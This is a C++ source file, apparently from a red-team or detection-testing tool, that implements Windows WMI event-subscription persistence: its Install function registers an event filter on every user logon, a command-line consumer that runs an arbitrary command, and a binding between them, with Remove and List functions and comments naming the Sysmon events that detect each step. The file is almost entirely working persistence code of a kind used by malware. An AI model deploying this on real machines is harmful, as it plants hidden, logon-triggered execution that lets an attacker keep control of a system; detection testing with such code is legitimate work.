#include "WMIPersist.h"
#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

static HRESULT ConnectSubscription(IWbemLocator** ppLoc, IWbemServices** ppSvc) {
    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator, (void**)ppLoc);
    if (FAILED(hr)) return hr;
    hr = (*ppLoc)->ConnectServer(_bstr_t(L"ROOT\\subscription"),
                                 NULL, NULL, NULL, 0, NULL, NULL, ppSvc);
    if (FAILED(hr)) { (*ppLoc)->Release(); *ppLoc = nullptr; return hr; }
    CoSetProxyBlanket(*ppSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                      NULL, EOAC_NONE);
    return S_OK;
}

// ── Install ────────────────────────────────────────────────────────────────────

std::string WMIPersist::Install(const std::string& name, const std::string& cmd) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool ownCom = SUCCEEDED(hr);

    IWbemLocator*  pLoc = nullptr;
    IWbemServices* pSvc = nullptr;
    hr = ConnectSubscription(&pLoc, &pSvc);
    if (FAILED(hr)) {
        if (ownCom) CoUninitialize();
        return "wmipersist install: ConnectServer failed hr=0x" +
               std::to_string((unsigned)hr);
    }

    std::wstring wname(name.begin(), name.end());
    std::wstring wname_c = wname + L"_consumer";
    std::wstring wcmd(cmd.begin(), cmd.end());

    VARIANT v; VariantInit(&v);
    IWbemCallResult* pRes = nullptr;

    // ── 1. __EventFilter ─────────────────────────────────────────────────────
    // Detection: Sysmon EventID 19 — WmiEvent filter created with subscription query.
    IWbemClassObject* pFC = nullptr;
    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFC, NULL);
    IWbemClassObject* pF  = nullptr;
    if (pFC) { pFC->SpawnInstance(0, &pF); pFC->Release(); }
    if (!pF) {
        pSvc->Release(); pLoc->Release();
        if (ownCom) CoUninitialize();
        return "wmipersist install: cannot spawn __EventFilter instance";
    }

    v.vt = VT_BSTR; v.bstrVal = SysAllocString(wname.c_str());
    pF->Put(L"Name", 0, &v, 0); VariantClear(&v);
    v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"WQL");
    pF->Put(L"QueryLanguage", 0, &v, 0); VariantClear(&v);
    // Fire on every new logon session creation (user logon event)
    v.vt = VT_BSTR; v.bstrVal = SysAllocString(
        L"SELECT * FROM __InstanceCreationEvent WITHIN 5 "
        L"WHERE TargetInstance ISA 'Win32_LogonSession'");
    pF->Put(L"Query", 0, &v, 0); VariantClear(&v);
    v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"root\\cimv2");
    pF->Put(L"EventNameSpace", 0, &v, 0); VariantClear(&v);

    hr = pSvc->PutInstance(pF, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pRes);
    pF->Release(); if (pRes) { pRes->Release(); pRes = nullptr; }
    if (FAILED(hr)) {
        pSvc->Release(); pLoc->Release();
        if (ownCom) CoUninitialize();
        return "wmipersist install: PutInstance(EventFilter) failed hr=0x" +
               std::to_string((unsigned)hr);
    }

    // ── 2. CommandLineEventConsumer ───────────────────────────────────────────
    // Detection: Sysmon EventID 20 — WmiEvent consumer with CommandLineTemplate.
    IWbemClassObject* pCC = nullptr;
    pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pCC, NULL);
    IWbemClassObject* pC  = nullptr;
    if (pCC) { pCC->SpawnInstance(0, &pC); pCC->Release(); }
    if (!pC) {
        pSvc->Release(); pLoc->Release();
        if (ownCom) CoUninitialize();
        return "wmipersist install: cannot spawn CommandLineEventConsumer instance";
    }

    v.vt = VT_BSTR; v.bstrVal = SysAllocString(wname_c.c_str());
    pC->Put(L"Name", 0, &v, 0); VariantClear(&v);
    v.vt = VT_BSTR; v.bstrVal = SysAllocString(wcmd.c_str());
    pC->Put(L"CommandLineTemplate", 0, &v, 0); VariantClear(&v);

    hr = pSvc->PutInstance(pC, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pRes);
    pC->Release(); if (pRes) { pRes->Release(); pRes = nullptr; }
    if (FAILED(hr)) {
        pSvc->Release(); pLoc->Release();
        if (ownCom) CoUninitialize();
        return "wmipersist install: PutInstance(Consumer) failed hr=0x" +
               std::to_string((unsigned)hr);
    }

    // ── 3. __FilterToConsumerBinding ─────────────────────────────────────────
    // Detection: Sysmon EventID 21 — the binding object ties filter to consumer.
    IWbemClassObject* pBC = nullptr;
    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBC, NULL);
    IWbemClassObject* pB  = nullptr;
    if (pBC) { pBC->SpawnInstance(0, &pB); pBC->Release(); }
    if (!pB) {
        pSvc->Release(); pLoc->Release();
        if (ownCom) CoUninitialize();
        return "wmipersist install: cannot spawn __FilterToConsumerBinding instance";
    }

    std::wstring filterRef = L"__EventFilter.Name=\"" + wname + L"\"";
    std::wstring consRef   = L"CommandLineEventConsumer.Name=\"" + wname_c + L"\"";
    v.vt = VT_BSTR; v.bstrVal = SysAllocString(filterRef.c_str());
    pB->Put(L"Filter", 0, &v, 0); VariantClear(&v);
    v.vt = VT_BSTR; v.bstrVal = SysAllocString(consRef.c_str());
    pB->Put(L"Consumer", 0, &v, 0); VariantClear(&v);

    hr = pSvc->PutInstance(pB, WBEM_FLAG_CREATE_OR_UPDATE, NULL, &pRes);
    pB->Release(); if (pRes) { pRes->Release(); }

    pSvc->Release(); pLoc->Release();
    if (ownCom) CoUninitialize();

    if (FAILED(hr))
        return "wmipersist install: PutInstance(Binding) failed hr=0x" +
               std::to_string((unsigned)hr);

    return "wmipersist: installed '" + name + "'\n"
           "Fires on: every user logon (Win32_LogonSession creation)\n"
           "Runs: " + cmd + "\n"
           "Detection: Sysmon EID 19/20/21 should fire\n"
           "Remove with: wmipersist remove " + name;
}

// ── Remove ─────────────────────────────────────────────────────────────────────

std::string WMIPersist::Remove(const std::string& name) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool ownCom = SUCCEEDED(hr);

    IWbemLocator*  pLoc = nullptr;
    IWbemServices* pSvc = nullptr;
    hr = ConnectSubscription(&pLoc, &pSvc);
    if (FAILED(hr)) {
        if (ownCom) CoUninitialize();
        return "wmipersist remove: connect failed";
    }

    std::wstring wname(name.begin(), name.end());
    std::wstring wname_c = wname + L"_consumer";

    // Order: delete binding first, then consumer, then filter
    std::wstring bindPath =
        L"__FilterToConsumerBinding.Consumer="
        L"\"CommandLineEventConsumer.Name=\\\"" + wname_c + L"\\\"\","
        L"Filter=\"__EventFilter.Name=\\\"" + wname + L"\\\"\"";
    pSvc->DeleteInstance(_bstr_t(bindPath.c_str()), 0, NULL, NULL);

    std::wstring consPath = L"CommandLineEventConsumer.Name=\"" + wname_c + L"\"";
    pSvc->DeleteInstance(_bstr_t(consPath.c_str()), 0, NULL, NULL);

    std::wstring filterPath = L"__EventFilter.Name=\"" + wname + L"\"";
    pSvc->DeleteInstance(_bstr_t(filterPath.c_str()), 0, NULL, NULL);

    pSvc->Release(); pLoc->Release();
    if (ownCom) CoUninitialize();

    return "wmipersist: removed '" + name + "' (filter + consumer + binding deleted)";
}

// ── List ───────────────────────────────────────────────────────────────────────

std::string WMIPersist::List() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    bool ownCom = SUCCEEDED(hr);

    IWbemLocator*  pLoc = nullptr;
    IWbemServices* pSvc = nullptr;
    hr = ConnectSubscription(&pLoc, &pSvc);
    if (FAILED(hr)) {
        if (ownCom) CoUninitialize();
        return "wmipersist list: connect failed";
    }

    IEnumWbemClassObject* pEnum = nullptr;
    pSvc->ExecQuery(_bstr_t(L"WQL"),
                    _bstr_t(L"SELECT Name,Query FROM __EventFilter"),
                    WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                    NULL, &pEnum);

    std::string out = "WMI EventFilters in ROOT\\subscription:\n";
    int count = 0;

    if (pEnum) {
        IWbemClassObject* pObj = nullptr;
        ULONG n = 0;
        while (pEnum->Next(WBEM_INFINITE, 1, &pObj, &n) == S_OK && n == 1) {
            VARIANT vName, vQuery;
            VariantInit(&vName); VariantInit(&vQuery);
            pObj->Get(L"Name",  0, &vName,  NULL, NULL);
            pObj->Get(L"Query", 0, &vQuery, NULL, NULL);
            if (vName.vt == VT_BSTR) {
                std::wstring w(vName.bstrVal);
                out += "  Name:  " + std::string(w.begin(), w.end()) + "\n";
            }
            if (vQuery.vt == VT_BSTR) {
                std::wstring w(vQuery.bstrVal);
                out += "  Query: " + std::string(w.begin(), w.end()) + "\n";
            }
            out += "---\n";
            ++count;
            VariantClear(&vName); VariantClear(&vQuery);
            pObj->Release();
        }
        pEnum->Release();
    }

    pSvc->Release(); pLoc->Release();
    if (ownCom) CoUninitialize();

    if (!count) out += "  (none — no WMI persistence detected)\n";
    return out + std::to_string(count) + " filter(s) found";
}
